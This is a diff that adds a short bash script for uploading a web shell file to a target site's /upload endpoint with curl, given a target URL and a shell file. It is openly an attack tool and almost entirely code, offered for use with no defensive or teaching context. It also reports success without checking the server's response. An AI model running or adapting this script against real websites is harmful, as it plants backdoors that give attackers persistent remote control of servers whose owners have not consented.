@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# Usage: ./web_shell_uploader.sh <target_url> <shell_file>
+TARGET_URL=$1
+SHELL_FILE=$2
+
+if [ -z "$TARGET_URL" ] || [ -z "$SHELL_FILE" ]; then
+    echo "Usage: $0 <target_url> <shell_file>"
+    exit 1
+fi
+
+echo "Uploading web shell to $TARGET_URL..."
+
+# Use curl to upload the shell
+curl -F "file=@$SHELL_FILE" "$TARGET_URL/upload"
+
+echo "Web shell uploaded successfully."
